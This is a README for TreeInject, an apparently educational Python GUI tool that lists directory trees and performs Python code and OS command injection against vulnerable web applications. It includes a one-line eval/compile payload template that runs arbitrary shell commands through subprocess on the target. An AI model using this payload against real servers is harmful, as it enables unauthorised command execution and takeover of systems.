# TreeInject

TreeInject is a GUI app python based using module tKinter, that supports 2 functionalities
  - **Tree host dir. structure**
  
	  It will list contents of directories in a tree-like format. It is a recursive directory listing program that produces a depth indented listing of files.
  - **OS Command injection**
  
    A web application vulnerable to Python code injection allows you to send Python code though the application to the Python interpreter on the target server.

### Installation

TreeInject requires [Python](https://www.python.org/downloads/) v3+ to run.

Used modules for dev of TreeInject:
- [Tkinter](https://github.com/python/cpython/tree/master/Lib/tkinter/)
- [BeautifulSoup](https://github.com/waylan/beautifulsoup)

*Cloning repository*
```sh
$ git clone https://github.com/durajetz/TreeInject
$ cd TreeInject
$ python3 main.py
```

#  Functionality
<p align="center"><b><em>For the purpose of testing the program an Vulnerable website offline was used.</em></b></br></p>
<p align="center">
Choosing the function we want to implement, pops up new window</p>
<p align="center">
<img src="https://media4.giphy.com/media/GijNtQfpydqijSROH7/giphy.gif" alt=""  width="320px"></p>

<p align="center">
The structure of folders on the host where the application is located, which will be open after clicking on the first function</p>
<p align="center">
<img src="https://media0.giphy.com/media/jw6Zy69bwWX3a1obDl/giphy.gif" alt="" width="320px"></p>


<p align="center">
Injection only giving the payload with the specific expression:</p>
<p align="center">
<img src="https://media4.giphy.com/media/KPRU4rIJbDxUMmjow4/giphy.gif" alt=""  width="480px"></p>


```
eval(compile("""for x in range(1):\n import subprocess\n subprocess.check_output(r'COMMAND',shell=True)""",'','single'))
```
<p align="center">
Injection with custom payload expression:</p>
<p align="center">
<img src="https://media4.giphy.com/media/JkzlYa6WGpphEsPr5J/giphy.gif" alt="" width="480px"></p>



License
----

MIT
